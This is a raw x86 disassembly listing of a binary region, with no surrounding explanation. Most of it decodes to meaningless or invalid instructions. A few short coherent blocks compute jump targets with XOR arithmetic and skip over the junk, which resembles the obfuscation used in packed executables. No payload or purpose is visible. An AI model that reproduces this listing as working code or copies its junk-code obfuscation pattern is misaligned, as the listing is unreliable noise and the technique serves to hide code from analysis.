  4028d8:	jecxz  0x402862
  4028da:	or     al,0x37
  4028dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4028dd:	(bad)  
  4028df:	cmp    esp,0x56e82af7
  4028e5:	arpl   WORD PTR [ecx+eiz*8+0x5a9aaa27],ax
  4028ec:	pop    es
  4028ed:	mov    edi,0xbf2b5806
  4028f2:	test   BYTE PTR [ebp+0x618f6f0a],dl
  4028f8:	idiv   ecx
  4028fa:	mov    ebp,0x7febfe6f
  4028ff:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  402901:	mov    edi,0x9b1f5f21
  402906:	popa   
  402907:	inc    eax
  402908:	test   al,0x83
  40290a:	adc    BYTE PTR [ecx-0x164b6bbf],ch
  402910:	outs   dx,DWORD PTR ds:[esi]
  402911:	out    0x39,al
  402913:	or     eax,0x16352746
  402918:	out    0x69,al
  40291a:	pop    ecx
  40291b:	shl    DWORD PTR [edx],0x3
  40291e:	in     eax,0x9a
  402920:	es ins DWORD PTR es:[edi],dx
  402922:	or     BYTE PTR [edx],dl
  402924:	cmp    edi,DWORD PTR [esi]
  402926:	dec    ebx
  402927:	adc    edi,DWORD PTR [ecx-0x4e]
  40292a:	aas    
  40292b:	fidivr WORD PTR [edx+0x70]
  40292e:	addr16 ds pop esi
  402931:	(bad)  
  402932:	or     BYTE PTR [di-0x74],al
  402936:	enter  0x4786,0x84
  40293a:	pop    ecx
  40293b:	push   0x2233ba0a
  402940:	mov    al,0x96
  402942:	add    al,0xd1
  402944:	imul   esi,DWORD PTR [eax+0x70e1a186],0xe0f6d0c
  40294e:	cs mov dh,0xe7
  402951:	xor    DWORD PTR [esi-0x2bbcb797],edx
  402957:	repnz (bad) 
  402959:	jne    0x40295a
  40295b:	sbb    esi,edi
  40295d:	jno    0x40292e
  40295f:	xchg   DWORD PTR [ebx],ebp
  402961:	push   ds
  402962:	(bad)  
  402963:	cmp    cl,BYTE PTR [ebx]
  402965:	push   cs
  402966:	mov    DWORD PTR [eax],esi
  402968:	outs   dx,DWORD PTR ds:[esi]
  402969:	jecxz  0x40291e
  40296b:	jecxz  0x402960
  40296d:	mov    eax,0x3e7032a4
  402972:	pop    ebx
  402973:	dec    ecx
  402974:	call   0x98fcd3d1
  402979:	ret    
  40297a:	cs ret 
  40297c:	xor    edx,DWORD PTR [ecx]
  40297e:	iret   
  40297f:	xchg   edx,eax
  402980:	stos   DWORD PTR es:[edi],eax
  402981:	mov    ebx,0x4cf15a31
  402986:	imul   esi,DWORD PTR [eax-0x4e],0x243e4c0b
  40298d:	cs mov ch,0xf9
  402990:	mov    bl,0x53
  402992:	inc    edx
  402993:	mov    ch,0xca
  402996:	stos   BYTE PTR es:[edi],al
  402997:	cmp    ebx,DWORD PTR [esp+ebx*1]
  40299a:	test   eax,0xbc14588a
  40299f:	(bad)  
  4029a0:	lea    ebp,[edi-0x4d]
  4029a3:	or     BYTE PTR [ebp-0x234af606],bl
  4029a9:	jbe    0x40296b
  4029ab:	jae    0x4029b5
  4029ad:	sti    
  4029ae:	sbb    al,0x79
  4029b0:	sbb    eax,0x1ad0d3a2
  4029b5:	in     eax,0xfc
  4029b7:	sub    DWORD PTR [edi+0x6b22d0eb],ebx
  4029bd:	mov    esi,0x5aa5a7
  4029c2:	in     eax,0x79
  4029c4:	push   ss
  4029c5:	mov    ds:0x856990a5,al
  4029ca:	or     DWORD PTR [eax+0x16],eax
  4029cd:	mov    esp,0x8d317322
  4029d2:	xor    eax,0x60b85869
  4029d7:	iret   
  4029d8:	lods   eax,DWORD PTR ds:[esi]
  4029d9:	adc    DWORD PTR [edx-0x12b27f6d],edx
  4029df:	js     0x402a05
  4029e1:	bound  ebp,QWORD PTR [ebx]
  4029e3:	or     DWORD PTR [ecx+0x156478c5],esi
  4029e9:	push   es
  4029ea:	leave  
  4029eb:	adc    esp,DWORD PTR [edx+0x3f7a4774]
  4029f1:	pop    eax
  4029f2:	cmp    ecx,DWORD PTR [ebp+0x26]
  4029f5:	inc    edx
  4029f6:	push   es
  4029f7:	inc    eax
  4029f8:	daa    
  4029f9:	xor    BYTE PTR [ebx+0x2756a26d],bh
  4029ff:	jp     0x4029a5
  402a01:	pop    ebx
  402a02:	adc    eax,0xd92f9565
  402a07:	add    ax,di
  402a0a:	push   ds
  402a0b:	imul   ebx,DWORD PTR [eax+0x17],0x6d
  402a0f:	add    esi,DWORD PTR [ebx-0x1e]
  402a12:	inc    esi
  402a13:	mov    eax,DWORD PTR [ebp-0x2c]
  402a16:	jne    0x402a1f
  402a1c:	mov    eax,DWORD PTR [ebp-0x10]
  402a1f:	xor    eax,esi
  402a21:	add    eax,edi
  402a23:	jmp    0x402bc4
  402a28:	or     al,0x32
  402a2a:	retf   
  402a2b:	jecxz  0x402a1e
  402a2d:	jecxz  0x402a63
  402a2f:	icebp  
  402a30:	loop   0x402a16
  402a32:	mov    bl,0xe4
  402a34:	pop    esp
  402a35:	push   ecx
  402a36:	les    edx,FWORD PTR [ebx-0x56]
  402a39:	or     eax,0x7ffa7e7e
  402a3e:	jle    0x402abe
  402a40:	shl    BYTE PTR [ecx],cl
  402a42:	mov    BYTE PTR [ebx+edx*4],0x49
  402a46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a47:	ins    BYTE PTR es:[edi],dx
  402a48:	inc    edx
  402a49:	int3   
  402a4a:	mov    DWORD PTR [ebx],edi
  402a4c:	xor    eax,0x3afb4d1c
  402a51:	push   es
  402a52:	mov    ss,WORD PTR [ecx-0x19]
  402a55:	mov    esi,0x9bf81926
  402a5a:	popa   
  402a5b:	sub    eax,0xfb6b6180
  402a60:	jnp    0x402a73
  402a62:	mov    ds:0x42c8cc4f,eax
  402a67:	sub    esp,DWORD PTR [ecx-0xfdc121e]
  402a6d:	add    BYTE PTR [edx],bl
  402a6f:	push   edi
  402a70:	xor    eax,0xb2cf5f35
  402a75:	add    al,0xb5
  402a77:	popa   
  402a78:	mov    ?,ebx
  402a7a:	adc    eax,0x53f5fd70
  402a7f:	lahf   
  402a80:	mov    esi,0xad9a0d9
  402a85:	daa    
  402a86:	inc    ecx
  402a87:	rcr    BYTE PTR [ebx+0x1d],cl
  402a8a:	cld    
  402a8b:	cmc    
  402a8c:	add    ebx,edi
  402a8e:	or     DWORD PTR [edi],ecx
  402a90:	outs   dx,BYTE PTR ds:[esi]
  402a91:	adc    eax,0xabbc69ed
  402a96:	mov    ch,0x50
  402a98:	popf   
  402a99:	fwait
  402a9a:	or     BYTE PTR [ebp-0x48],bh
  402a9d:	jg     0x402a2c
  402a9f:	sbb    cl,BYTE PTR [eax+0x1563a72b]
  402aa5:	popa   
  402aa6:	pop    eax
  402aa7:	jb     0x402a4b
  402aa9:	sar    ch,1
  402aab:	dec    ecx
  402aac:	ror    edi,0x37
  402aaf:	fist   DWORD PTR gs:[esi-0x51]
  402ab3:	in     eax,0x36
  402ab5:	or     BYTE PTR ds:0xf88e5f0e,cl
  402abb:	das    
  402abc:	and    esi,ebx
  402abe:	add    al,0x40
  402ac0:	or     DWORD PTR [edx-0x2b],0xffffff88
  402ac4:	sub    eax,0x7d2ff251
  402ac9:	pop    edx
  402aca:	imul   ebp,DWORD PTR [eax-0x47],0x47f9dcd6
  402ad1:	add    BYTE PTR [ecx-0x39],0x4
  402ad5:	add    cl,BYTE PTR [edi+0x51]
  402ad8:	or     BYTE PTR [edi-0x3a],bl
  402adb:	sbb    al,0x71
  402add:	sbb    eax,0x3994652
  402ae2:	or     eax,0xc946255f
  402ae7:	int3   
  402ae8:	dec    ecx
  402ae9:	inc    ebx
  402aea:	outs   dx,DWORD PTR ds:[esi]
  402aeb:	inc    esi
  402aec:	sub    al,0xdb
  402aee:	ins    BYTE PTR es:[edi],dx
  402aef:	out    dx,eax
  402af0:	out    0x36,eax
  402af2:	xchg   esp,eax
  402af3:	or     BYTE PTR [ecx-0x347e1bd2],dh
  402af9:	js     0x402acd
  402afb:	lods   eax,DWORD PTR ds:[esi]
  402afc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402afd:	add    eax,eax
  402aff:	nop
  402b00:	popa   
  402b01:	add    bh,al
  402b03:	jae    0x402ad6
  402b05:	jmp    0x402a97
  402b07:	pop    es
  402b08:	hlt    
  402b09:	ins    BYTE PTR es:[edi],dx
  402b0a:	mov    bl,0xcf
  402b0c:	mov    al,0x64
  402b0e:	jmp    0x381c:0x9f19270a
  402b15:	mov    dl,0xab
  402b17:	arpl   WORD PTR [edx-0x33],si
  402b1a:	xor    al,0x26
  402b1c:	mov    bh,0xa7
  402b1e:	mov    al,0x1a
  402b20:	mov    DWORD PTR ds:0x697e718c,ebx
  402b26:	sar    BYTE PTR [eax],cl
  402b28:	push   edi
  402b29:	into   
  402b2a:	fs pop ecx
  402b2c:	call   0x99e9c90e
  402b31:	add    eax,0xb6e05a9e
  402b36:	fstp   DWORD PTR [ebx+edi*8-0x1b]
  402b3a:	pushf  
  402b3b:	pusha  
  402b3c:	outs   dx,DWORD PTR ds:[esi]
  402b3d:	ror    BYTE PTR [eax-0x3c],1
  402b40:	jns    0x402ad0
  402b42:	jbe    0x402b0d
  402b44:	sbb    DWORD PTR [ecx],ebp
  402b46:	aas    
  402b47:	jmp    0x25af:0x881fead1
  402b4e:	iret   
  402b4f:	xchg   BYTE PTR [eax],ch
  402b51:	aad    0xd2
  402b53:	jmp    0x591d:0x424b0446
  402b5a:	leave  
  402b5b:	idiv   cl
  402b5d:	fs jmp 0xd4309ce5
  402b63:	lds    ecx,FWORD PTR ds:0x108a6b4e
  402b69:	or     BYTE PTR [eax],0xb
  402b6c:	xor    ebx,DWORD PTR [ecx-0x25690318]
  402b72:	es mov esp,0xbb5fc4e3
  402b78:	mov    edi,DWORD PTR [edx+0x43f92a8]
  402b7e:	bound  esp,QWORD PTR [edx+0x26]
  402b81:	retf   0x197d
  402b84:	(bad)
  402b87:	fldenv [ebx]
  402b89:	(bad)  
  402b8a:	mov    ah,0x47
  402b8c:	cmc    
  402b8d:	xor    edi,ebx
  402b8f:	jge    0x402b2d
  402b91:	xchg   BYTE PTR [ecx+ebp*1],bh
  402b94:	lods   eax,DWORD PTR ds:[esi]
  402b95:	stc    
  402b96:	iret   
  402b97:	repnz icebp 
  402b99:	imul   edi,ebp,0xffffffab
  402b9c:	rcr    DWORD PTR [edx-0x73],cl
  402b9f:	aad    0x11
  402ba1:	sbb    edi,DWORD PTR [edx-0x2a65380a]
  402ba7:	loope  0x402b95
  402ba9:	xchg   edi,eax
  402baa:	retf   
  402bab:	retf   0x1265
  402bae:	and    al,0xb4
  402bb0:	fs jge 0x402b50
  402bb3:	adc    al,0x86
  402bb5:	and    al,0xd6
  402bb7:	mov    WORD PTR [ebx],fs
  402bb9:	sbb    DWORD PTR [ecx+ebx*1+0x6b],edi
  402bbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402bbe:	into   
  402bbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402bc0:	imul   eax,DWORD PTR [ebp-0x3f7a9486],0x28840f
  402bca:	add    BYTE PTR [eax],al
  402bcc:	lea    eax,[ebp-0x98]
  402bd2:	push   eax
  402bd3:	mov    eax,DWORD PTR [ebp-0x1c]
  402bd6:	xor    eax,esi
  402bd8:	add    eax,edi
  402bda:	push   eax
  402bdb:	mov    eax,DWORD PTR [ebp-0x18]
  402bde:	add    eax,0xee
  402be3:	push   eax
  402be4:	mov    eax,DWORD PTR [ebp-0x18]
  402be7:	mov    eax,DWORD PTR [eax+0x198]
  402bed:	push   DWORD PTR [eax]
  402bef:	call   0x40984d
  402bf4:	mov    ecx,DWORD PTR [ebp-0x28]
  402bf7:	xor    ecx,esi
  402bf9:	mov    eax,0xffcd8d65
  402bfe:	sub    eax,ecx
  402c00:	jmp    0x402da1
  402c05:	add    DWORD PTR [edx-0x2e6a296b],ecx
  402c0b:	inc    ecx
  402c0c:	dec    ecx
  402c0d:	aas    
  402c0e:	cmp    al,0x84
  402c10:	out    dx,al
  402c11:	jmp    0x36c7c21e
  402c16:	or     edi,DWORD PTR [esi+0x7e]
  402c19:	cli    
  402c1a:	jg     0x402c9a
  402c1c:	jle    0x402bdc
  402c1e:	push   ss
  402c1f:	and    BYTE PTR [esi+esi*4-0x2ac16dc9],dl
  402c26:	data16 adc BYTE PTR [ebp-0xe6f9424],bl
  402c2d:	out    dx,eax
  402c2e:	ja     0x402ca7
  402c30:	lods   eax,DWORD PTR ds:[esi]
  402c31:	sub    eax,0xa2c057a1
  402c36:	dec    ebp
  402c37:	mov    al,ds:0xfe013ce2
  402c3c:	jge    0x402bcd
  402c3e:	xchg   edi,eax
  402c3f:	pop    ebx
  402c40:	and    eax,0xe1427a7e
  402c45:	hlt    
  402c46:	dec    esi
  402c47:	scas   eax,DWORD PTR es:[edi]
  402c48:	pop    es
  402c49:	pop    ds
  402c4a:	ret    0xeec4
  402c4d:	dec    esp
  402c4e:	in     eax,dx
  402c4f:	xor    al,0x6e
  402c51:	xchg   edi,eax
  402c52:	loop   0x402c50
  402c54:	sbb    DWORD PTR [ecx+0x77ea2b4],eax
  402c5a:	pop    ebp
  402c5b:	test   ah,ah
  402c5d:	mov    ecx,0x16fdb958
  402c62:	inc    ecx
  402c63:	lods   al,BYTE PTR ds:[esi]
  402c64:	(bad)  
  402c65:	repz (bad) 
  402c67:	jle    0x402c50
  402c69:	dec    edi
  402c6a:	pop    esp
  402c6b:	sbb    BYTE PTR [esi],al
  402c6d:	fst    DWORD PTR [edx]
  402c6f:	jae    0x402c3a
  402c71:	into   
  402c72:	in     eax,0x3
  402c74:	retf   
  402c75:	mov    ebp,0x82b36fe5
  402c7a:	push   esi
  402c7b:	sub    edi,0xffffffec
  402c7e:	leave  
  402c7f:	mov    ebp,DWORD PTR [ebp-0x45]
  402c82:	lods   al,BYTE PTR ds:[esi]
  402c83:	adc    BYTE PTR [edi-0x2493e234],0x9d
  402c8a:	pop    ebx
  402c8b:	pop    edx
  402c8c:	std    
  402c8d:	aas    
  402c8e:	push   cs
  402c8f:	mov    ebx,0x74b18e6f
  402c94:	push   esi
  402c95:	out    0x4a,al
  402c97:	repnz xor BYTE PTR [edx-0xc7f5a39],cl
  402c9e:	sub    bl,dl
  402ca0:	mov    BYTE PTR [ecx-0x1d],bl
  402ca3:	pop    edx
  402ca4:	enter  0x4fa3,0x26
  402ca8:	mov    eax,DWORD PTR [edx]
  402caa:	scas   eax,DWORD PTR es:[edi]
  402cab:	or     BYTE PTR [ebp+0x751e2990],dh
  402cb1:	retf   
  402cb2:	xchg   esp,eax
  402cb3:	adc    ah,dl
  402cb5:	pop    eax
  402cb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402cb7:	inc    edi
  402cb8:	mov    cl,0x71
  402cba:	xchg   esi,eax
  402cbb:	and    dl,dl
  402cbd:	stos   DWORD PTR es:[edi],eax
  402cbe:	fst    QWORD PTR [ecx+0x3f]
  402cc1:	scas   eax,DWORD PTR es:[edi]
  402cc2:	sbb    cl,bh
  402cc4:	ss loopne 0x402c9b
  402cc7:	pop    edx
  402cc8:	fistp  WORD PTR [ebp+0x3e0c49c2]
  402cce:	jno    0x402d37
  402cd0:	aaa    
  402cd1:	dec    eax
  402cd2:	fidivr WORD PTR [ebp+0x6f86d888]
  402cd8:	push   esi
  402cd9:	mov    eax,0x1e66a631
  402cde:	mov    ebx,0x21d541f8
  402ce3:	stc    
  402ce4:	je     0x402d2f
  402ce6:	add    DWORD PTR [ecx],edi
  402ce8:	in     al,dx
  402ce9:	nop
  402cea:	shr    BYTE PTR [ecx-0x1c2388b6],1
  402cf0:	imul   ebx,edi,0x6c
  402cf3:	inc    esi
  402cf4:	(bad)  
  402cf5:	mul    edi
  402cf7:	out    0x45,eax
  402cf9:	stos   BYTE PTR es:[edi],al
  402cfa:	std    
  402cfb:	fcmovnu st,st(3)
  402cfd:	imul   ebx,DWORD PTR [edx],0x47
  402d00:	shr    DWORD PTR [edi+0x21],1
  402d03:	add    eax,0x3c25a6f3
  402d08:	int3   
  402d09:	shr    bl,1
  402d0b:	jmp    0x402cc6
  402d0d:	(bad)  
  402d0e:	jle    0x402d21
  402d10:	cld    
  402d11:	stos   DWORD PTR es:[edi],eax
  402d12:	adc    ah,ah
  402d14:	jl     0x402d7f
  402d16:	mov    esi,0x6eeaf355
  402d1b:	mov    bh,cl
  402d1d:	and    BYTE PTR [ecx-0x155655bd],bh
  402d23:	ins    DWORD PTR es:[edi],dx
  402d24:	lahf   
  402d25:	test   DWORD PTR [esi+0x4b857577],esp
  402d2b:	stc    
  402d2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d2d:	cdq    
  402d2e:	(bad)  
  402d30:	add    dh,ch
  402d32:	xchg   esp,eax
  402d33:	loop   0x402cfa
  402d35:	jb     0x402cfb
  402d37:	mov    DWORD PTR [eax+ebp*8-0x18fb54d3],edx
  402d3e:	shr    BYTE PTR [edi-0x1],1
  402d41:	loope  0x402d9f
  402d43:	sbb    DWORD PTR [ebp-0x17],0xffffff9c
  402d47:	mov    al,bh
  402d49:	lock push es
  402d4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d4c:	sbb    al,0x87
  402d4e:	fdiv   st(6),st
  402d50:	imul   esp,DWORD PTR [ecx],0xffffff85
  402d53:	bound  esi,QWORD PTR [ecx]
  402d55:	in     eax,0x99
  402d57:	repnz ins BYTE PTR es:[edi],dx
  402d59:	pop    eax
  402d5a:	jne    0x402dc2
  402d5c:	sub    edi,edi
  402d5e:	and    eax,esi
  402d60:	rol    DWORD PTR [ebp+0xa],1
  402d63:	jmp    0x28c4cf5f
  402d68:	push   cs
  402d69:	inc    esp
  402d6a:	ret    0xb9be
  402d6d:	fcom   QWORD PTR [edi]
  402d6f:	and    esp,edi
  402d71:	sbb    eax,0xe9c5ca4b
  402d76:	pusha  
  402d77:	call   0xfbff:0xa7573957
  402d7e:	push   ebp
  402d7f:	dec    eax
  402d80:	jno    0x402d13
  402d82:	sbb    ebp,ebp
  402d84:	fistp  DWORD PTR [ebp+esi*1+0x5ad4199]
  402d8b:	mov    edx,0x2686b67
  402d90:	mov    edx,0xaa690548
  402d95:	or     edx,DWORD PTR ds:0xba0d2280
  402d9b:	or     ebp,DWORD PTR [ebx+edx*2]
  402d9e:	aam    0x96
  402da0:	fisubr DWORD PTR [ebx]
  402da2:	inc    ebp
  402da3:	cld    
  402da4:	mov    ecx,DWORD PTR [ebp-0x48]
  402da7:	add    ecx,eax
  402da9:	mov    eax,DWORD PTR [ebp-0x4]
  402dac:	mov    DWORD PTR [eax+0x1],ecx
  402daf:	mov    al,BYTE PTR [ebp-0x11]
  402db2:	mov    ecx,DWORD PTR [ebp-0x4]
  402db5:	xor    al,0x46
  402db7:	sub    al,0x38
  402db9:	mov    BYTE PTR [ecx],al
  402dbb:	lea    eax,[ebp-0x4]
  402dbe:	inc    BYTE PTR [eax]
  402dc0:	inc    eax
  402dc1:	push   eax
  402dc2:	pop    ecx
  402dc3:	dec    ecx
  402dc4:	xchg   ecx,edx
  402dc6:	dec    BYTE PTR [edx]
  402dc8:	push   DWORD PTR [ebp-0x18]
  402dcb:	mov    eax,ds:0x413bf0
  402dd0:	mov    eax,DWORD PTR [eax]
  402dd2:	push   DWORD PTR [eax]
  402dd4:	jmp    0x402f75
  402dd9:	jmp    0x402df6
  402ddb:	xchg   dh,bl
  402ddd:	push   esi
  402dde:	arpl   WORD PTR [ebx+0x2b],si
  402de1:	nop
  402de2:	push   edi
  402de3:	ror    BYTE PTR [ebx+ebx*1-0x51],1
  402de7:	add    DWORD PTR [edi+0x7e7e08b2],edx
  402ded:	cli    
  402dee:	jg     0x402e6e
  402df0:	jle    0x402e16
  402df2:	jmp    0x402d96
  402df4:	and    DWORD PTR [ecx-0x13],0xffffffd4
  402df8:	adc    eax,0x4514b7be
  402dfd:	dec    BYTE PTR [eax-0x50]
  402e00:	xor    eax,0x9e5a91dd
  402e05:	xor    edx,ebp
  402e07:	shl    BYTE PTR [ecx+eiz*1+0x1d73e556],0xbd
  402e0f:	jns    0x402df7
  402e11:	or     al,0x4e
  402e13:	jbe    0x402e68
  402e15:	aas    
  402e16:	popf   
  402e17:	cdq    
  402e18:	mov    eax,0xd7178049
  402e1d:	leave  
  402e1e:	sub    al,0x99
  402e20:	push   edi
  402e21:	pop    ss
  402e22:	int    0x80
  402e24:	leave  
  402e25:	adc    al,0x1e
  402e27:	xor    al,0x20
  402e29:	ret    0x6120
  402e2c:	jne    0x402e08
  402e2e:	sar    BYTE PTR [eax+eax*4-0x6],1
  402e32:	rcr    esi,cl
  402e34:	mov    edx,0xe871e0
  402e39:	push   edx
  402e3a:	push   cs
  402e3b:	(bad)  
  402e3c:	icebp  
  402e3d:	scas   eax,DWORD PTR es:[edi]
  402e3e:	dec    esp
  402e3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e40:	and    BYTE PTR [edi],0x9a
  402e43:	jecxz  0x402e4e
  402e45:	(bad)  [eax-0x37857f33]
  402e4b:	mov    ds:0xef12e978,eax
  402e50:	mov    al,0x34
  402e52:	icebp  
  402e53:	loope  0x402dfe
  402e55:	sbb    ecx,DWORD PTR [esi*8+0x108f6c13]
  402e5c:	mov    al,0x97
  402e5e:	in     eax,dx
  402e5f:	adc    dh,BYTE PTR [edi+esi*1]
  402e62:	iret   
  402e63:	loope  0x402ead
  402e65:	sub    dl,BYTE PTR ds:0x319e82cd
  402e6b:	retf   0xd00f
  402e6e:	mov    dl,0xf5
  402e70:	stc    
  402e71:	add    eax,0xd0a820f7
  402e76:	loopne 0x402eca
  402e78:	and    bl,BYTE PTR [eax]
  402e7a:	(bad)  
  402e7b:	sub    al,BYTE PTR [ebx+0xd623e67]
  402e81:	push   ebx
  402e82:	out    0x50,eax
  402e84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e85:	or     eax,0x5b06e068
  402e8a:	clc    
  402e8b:	push   cs
  402e8c:	xchg   esp,eax
  402e8d:	jns    0x402e26
  402e8f:	jmp    0xb368:0xd5802a17
  402e96:	mov    dh,0x6a
  402e98:	jns    0x402e5b
  402e9a:	or     dl,al
  402e9c:	mov    ecx,0x6744849e
  402ea1:	pop    esi
  402ea2:	jmp    0x907c:0xb44ca6bb
  402ea9:	cmp    eax,0x2934aa76
  402eae:	xor    eax,0x9b90df7b
  402eb3:	lds    ebp,FWORD PTR [esi-0x34999b2e]
  402eb9:	fld    TBYTE PTR [ecx-0x40]
  402ebc:	mov    ebp,0xeafdab13
  402ec1:	xor    BYTE PTR [edi-0x700f02e],ah
  402ec7:	pop    eax
  402ec8:	cmp    edi,0x3d
  402ecb:	(bad)  
  402ecc:	cmovl  edi,DWORD PTR [ebp+0x178d1867]
  402ed3:	stc    
  402ed4:	out    0x9d,al
  402ed6:	pop    ss
  402ed7:	add    edx,edi
  402ed9:	and    al,0x3a
  402edb:	jmp    DWORD PTR [ebx-0x22]
  402ede:	add    al,0xeb
  402ee0:	jmp    0xb984:0x4d43dbbf
  402ee7:	lds    eax,FWORD PTR [ebx+edx*1+0x4ba9840d]
  402eee:	mov    DWORD PTR [ebp+0x1ee68310],edx
  402ef4:	jb     0x402ef0
  402ef6:	arpl   WORD PTR [edi],bx
  402ef8:	shl    esi,1
  402efa:	ss pop esi
  402efc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402efd:	inc    edi
  402efe:	repz rcl BYTE PTR ds:0xb5bdaaae,1
  402f05:	sub    al,0x79
  402f07:	mov    ecx,0x6068dc49
  402f0c:	scas   eax,DWORD PTR es:[edi]
  402f0d:	in     al,0xc
  402f0f:	fwait
  402f10:	sub    al,bh
  402f12:	dec    eax
  402f13:	cmp    DWORD PTR [ebx+0xfe61a73],edi
  402f19:	loope  0x402ec1
  402f1b:	popf   
  402f1c:	mov    esi,0x44de6a13
  402f21:	pop    ds
  402f22:	mov    ecx,0xff36a130
  402f27:	adc    ch,BYTE PTR ds:0xa4bc6f9
  402f2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f2e:	leave  
  402f2f:	popa   
  402f30:	clc    
  402f31:	xor    DWORD PTR [esp-0x58],0xffffff87
  402f36:	mov    bl,0x8d
  402f38:	xchg   ecx,eax
  402f39:	mov    ah,0xdf
  402f3b:	xchg   BYTE PTR [ebx-0x435a653d],bl
  402f41:	lods   al,BYTE PTR ds:[esi]
  402f42:	test   al,0x23
  402f44:	jecxz  0x402f6e
  402f46:	sbb    bl,ch
  402f48:	cld    
  402f49:	mov    dl,0xdf
  402f4b:	stc    
  402f4c:	lahf   
  402f4d:	add    BYTE PTR fs:[ecx+eiz*1],0xac
  402f52:	adc    BYTE PTR [edx],0x45
  402f55:	arpl   bx,cx
  402f57:	(bad)  
  402f58:	xchg   ebx,eax
  402f59:	out    0xfa,al
  402f5b:	fidiv  WORD PTR [edx]
  402f5d:	scas   al,BYTE PTR es:[edi]
  402f5e:	or     al,0x4a
  402f60:	xor    al,0xff
  402f62:	jne    0x402fd2
  402f64:	mov    dh,0xd8
  402f66:	mov    ds:0x566400ee,al
  402f6b:	les    ebx,FWORD PTR [edx-0x358b7792]
  402f71:	jmp    0x8db2cca7
  402f76:	add    eax,0x413c0c
  402f7b:	push   DWORD PTR [eax]
  402f7d:	lea    eax,ds:0x4139b8
  402f83:	push   DWORD PTR [eax]
  402f85:	lea    eax,ds:0x413bec
  402f8b:	push   DWORD PTR [eax]
  402f8d:	lea    eax,ds:0x413d34
  402f93:	push   DWORD PTR [eax]
  402f95:	xchg   ebx,edx
  402f97:	inc    ebx
  402f98:	inc    ebx
  402f99:	push   ebx
  402f9a:	pop    eax
  402f9b:	jmp    0x40313c
  402fa0:	cmc    
  402fa1:	mov    ebp,0x63b00620
  402fa6:	icebp  
  402fa7:	ins    DWORD PTR es:[edi],dx
  402fa8:	sbb    esi,DWORD PTR [edi+0x5b1aa5b7]
  402fae:	mov    BYTE PTR [edi],dl
  402fb0:	ds push ss
  402fb2:	jle    0x403032
  402fb4:	cli    
  402fb5:	jg     0x403035
  402fb7:	jle    0x402f4a
  402fb9:	call   0xa866845d
  402fbe:	xchg   edi,eax
  402fbf:	scas   al,BYTE PTR es:[edi]
  402fc0:	dec    ebx
  402fc1:	jno    0x402fba
  402fc3:	dec    edx
  402fc4:	xor    eax,0x4b74e239
  402fc9:	stos   BYTE PTR es:[edi],al
  402fca:	xchg   esi,eax
  402fcb:	js     0x402fae
  402fcd:	pop    eax
  402fce:	stos   DWORD PTR es:[edi],eax
  402fcf:	es sub al,0xaa
  402fd2:	fwait
  402fd3:	and    BYTE PTR [ebx-0x6c],0x32
  402fd7:	mov    esi,0x813752f
  402fdc:	xchg   ebp,eax
  402fdd:	and    eax,0x10fface6
  402fe2:	pop    ebp
  402fe3:	xlat   BYTE PTR ds:[ebx]
  402fe4:	ret    0x5cdc
  402fe7:	(bad)  
  402fe9:	retf   0xc233
  402fec:	sbb    ah,BYTE PTR [edi]
  402fee:	jl     0x402f8c
  402ff0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ff1:	sub    esp,ebp
  402ff3:	stos   DWORD PTR es:[edi],eax
  402ff4:	lahf   
  402ff5:	mov    WORD PTR [edi-0x2b927c4b],?
  402ffb:	jmp    0x84da8526
  403000:	fsub   DWORD PTR cs:[edx+esi*2]
  403004:	aas    
  403005:	mov    ds,WORD PTR [esi+0x4e]
  403008:	inc    ebx
  403009:	movups xmm5,xmm2
  40300c:	pop    ds
  40300d:	int3   
  40300e:	mov    esi,0xa39a9c7d
  403013:	sub    BYTE PTR [edx],dl
  403015:	mov    bl,0x1c
  403017:	out    0x22,al
  403019:	add    eax,0x80bf6ba6
  40301e:	mov    cl,0xd6
  403020:	push   esp
  403021:	int    0xb2
  403023:	jg     0x403054
  403025:	inc    ebp
  403026:	shl    DWORD PTR [ecx],cl
  403028:	sub    ebx,DWORD PTR [ebp+0x2083ccb3]
  40302e:	int    0xde
  403030:	sub    BYTE PTR [esi+0x21608381],dh
  403036:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403037:	mov    ds:0xf4af2c7f,al
  40303c:	inc    esp
  40303d:	fistp  QWORD PTR [ebx]
  40303f:	rcr    al,0x8e
  403042:	loopne 0x403086
  403044:	cmp    ch,0x99
  403047:	mov    esp,0xdcf61f50
  40304c:	cmc    
  40304d:	in     al,dx
  40304e:	daa    
  40304f:	pop    eax
  403050:	ja     0x4030b4
  403052:	cmp    eax,0xe6db402b
  403057:	jmp    0x403074
  403059:	jo     0x403052
  40305b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40305c:	mov    bl,0x17
  40305e:	imul   bh
  403060:	cmp    ah,BYTE PTR [esi+ecx*1-0x5]
  403064:	cmovne edi,DWORD PTR [esi]
  403067:	jb     0x403085
  403069:	sahf   
  40306a:	rep lods al,BYTE PTR ds:[esi]
  40306d:	leave  
  40306e:	mov    ebp,ecx
  403070:	test   al,0xb3
  403072:	inc    edi
  403073:	xor    al,0xe1
  403075:	fisttp DWORD PTR [edi]
  403077:	mov    ebx,0x1b617b42
  40307c:	jmp    0x403006
  40307e:	jp     0x403006
  403080:	scas   al,BYTE PTR es:[edi]
  403081:	cmp    esp,DWORD PTR [ecx]
  403083:	cmp    eax,0x5180fcd3
  403088:	jo     0x4030fc
  40308a:	push   0x54
  40308c:	iret   
  40308d:	(bad)  [esi-0xab9fa25]
  403093:	dec    ebp
  403094:	mov    ds:0xe0188a66,eax
  403099:	lods   eax,DWORD PTR ds:[esi]
  40309a:	xchg   BYTE PTR [edx-0x34],ah
  40309d:	into   
  40309e:	xor    dh,BYTE PTR [eax+0x63503494]
